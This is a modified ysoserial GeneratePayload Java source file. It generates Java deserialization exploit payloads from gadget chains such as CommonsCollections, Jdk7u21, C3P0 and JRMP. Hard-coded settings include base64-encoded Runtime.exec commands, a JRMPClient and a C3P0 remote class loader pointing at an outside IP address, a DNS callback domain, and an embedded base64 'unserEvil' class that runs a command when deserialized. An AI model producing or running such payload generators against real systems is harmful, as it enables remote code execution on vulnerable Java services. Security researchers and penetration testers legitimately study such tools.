package ysoserial;

import java.io.*;
import java.util.*;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.MyObjectInputStream;
import ysoserial.payloads.util.unserUtils;

@SuppressWarnings("rawtypes")
public class GeneratePayload {
    private static final int INTERNAL_ERROR_CODE = 70;
    private static final int USAGE_CODE = 64;

    public static void main(final String[] args) {
//        String[] argss = new String[]{"URLDNS", "http://success.10k6l4.ceye.io"};
//        String[] argss = new String[]{"JRMPClient", "8.129.107.19:7777"};
        String[] argss = new String[]{"CommonsCollectionsURL", "file:///d:/a.txt|0|102"};
//        String[] argss = new String[]{"CommonsCollections10", "calc.exe"};
//        String[] argss = new String[]{"CommonsCollectionsDoubleUnser", "calc.exe"};
        //修改了yso原有cc链createTemplatesImpl->insertAfter中的cmd
//        String[] argss = new String[]{"CommonsCollections2", "UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY2FsYy5leGUiKTs="};//base64('Runtime.getRuntime().exec("calc.exe");')
//        String[] argss = new String[]{"CommonsCollections3", "UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY2FsYy5leGUiKTs="};//base64('Runtime.getRuntime().exec("calc.exe");')
//        String[] argss = new String[]{"Jdk7u21", "UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY2FsYy5leGUiKTs="};//base64('Runtime.getRuntime().exec("calc.exe");')

        //String[] argss = new String[]{"CommonsCollections10Echo", "TomcatServletResponse1"};
        //String[] argss = new String[]{"CommonsCollections10Echo", "TomcatBigHeader"};
        //String[] argss = new String[]{"CommonsCollections10Echo", "Tomcat78ClassLoader"};

//        String[] argss = new String[]{"ysoserial.exploit.JRMPListener", "7777", "CommonsCollections1", "touch /tmp/popko"};
        //String[] argss = new String[]{"JRMPListener", "7777"};
        //String[] argss = new String[]{"CommonsCollections2Echo", "SpringMVCEcho"};
        String content = "yv66vgAAADMALgoABwAbCgAcAB0KAB4AHwgAIAoAHgAhBwAiBwAjBwAkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMdW5zZXJFdmlsOwEACkV4Y2VwdGlvbnMHACUBAAt3cml0ZU9iamVjdAEAHihMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTspVgEAAW8BABtMamF2YS9pby9PYmplY3RJbnB1dFN0cmVhbTsHACYBAApyZWFkT2JqZWN0AQACaW4BAApTb3VyY2VGaWxlAQAOdW5zZXJFdmlsLmphdmEMAAkACgcAJwwAKAAKBwApDAAqACsBAAhjYWxjLmV4ZQwALAAtAQAJdW5zZXJFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABlqYXZhL2lvL09iamVjdElucHV0U3RyZWFtAQARZGVmYXVsdFJlYWRPYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAEACAAAAAMAAQAJAAoAAgALAAAAMwABAAEAAAAFKrcAAbEAAAACAAwAAAAKAAIAAAAGAAQABwANAAAADAABAAAABQAOAA8AAAAQAAAABAABABEAAgASABMAAgALAAAAPQABAAIAAAAFK7YAArEAAAACAAwAAAAKAAIAAAAKAAQACwANAAAAFgACAAAABQAOAA8AAAAAAAUAFAAVAAEAEAAAAAQAAQAWAAIAFwATAAIACwAAAEoAAgACAAAADiu2AAK4AAMSBLYABVexAAAAAgAMAAAADgADAAAADgAEABAADQARAA0AAAAWAAIAAAAOAA4ADwAAAAAADgAYABUAAQAQAAAABAABABYAAQAZAAAAAgAa";
        //String[] argss = new String[]{"AspectJWeaverNonrce", "target/classes/unserEvil.class;"+content};
        //String[] argss = new String[]{"BeanShell1", "calc.exe"};
        //String[] argss = new String[]{"C3P0", "http://8.129.107.19:5000/:Exploit"};
        //String[] argss = new String[]{"Clojure", "calc.exe"};
//        String[] argss = new String[]{"CommonsCollections2Echo", "CustomJavaCode"};//改成txt文件加载?
        if (argss.length != 2) {
            printUsage();
            System.exit(USAGE_CODE);
        }
        final String payloadType = argss[0];
        final String command = argss[1];
//		if (args.length != 2) {
//			printUsage();
//			System.exit(USAGE_CODE);
//		}
//		final String payloadType = args[0];
//		final String command = args[1];

        final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            printUsage();
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            String flag = "";//todo: controller
            if (flag.equals("print")) {
                PrintStream out = System.out;
                Serializer.serialize(object, out);
                ObjectPayload.Utils.releasePayload(payload, object);
            } else if (flag.equals("hexprint")) {
                String data = unserUtils.objectToHexString(object);
                System.out.println(data);
                byte[] b = unserUtils.hexStringToBytes(data);
                InputStream inputStream = new ByteArrayInputStream(b);
//                ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
                ObjectInputStream objectInputStream = new MyObjectInputStream(inputStream);
//                System.out.println(objectInputStream.readUTF());
//                System.out.println(objectInputStream.readInt());
//                if (name.equals("0CTF/TCTF") && year == 2021) {
//                }
                objectInputStream.readObject();
            } else if (flag.equals("b64print")) {
                System.out.println(unserUtils.objectToB64String(object));
            } else {//write
                String filePre;
                String filename;
                if (payloadType.contains("CommonsCollections")) {
                    filePre = "cc" + payloadType.substring("CommonsCollections".length());
                    filename = "D:\\javaWebTool\\ysoserial\\" + filePre + command + ".ser";
                } else {
                    filename = "D:\\javaWebTool\\ysoserial\\" + payloadType + ".ser";
                }
                ObjectOutputStream outputStream = null;
                outputStream = new ObjectOutputStream(new FileOutputStream(filename));
                outputStream.writeObject(object);
                outputStream.close();
            }
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }

    private static void printUsage() {
        System.err.println("Y SO SERIAL?");
        System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'");
        System.err.println("  Available payload types:");

        final List<Class<? extends ObjectPayload>> payloadClasses =
            new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
        Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

        final List<String[]> rows = new LinkedList<String[]>();
        rows.add(new String[]{"Payload", "Authors", "Dependencies"});
        rows.add(new String[]{"-------", "-------", "------------"});
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            rows.add(new String[]{
                payloadClass.getSimpleName(),
                Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
            });
        }

        final List<String> lines = Strings.formatTable(rows);

        for (String line : lines) {
            System.err.println("     " + line);
        }
    }
}
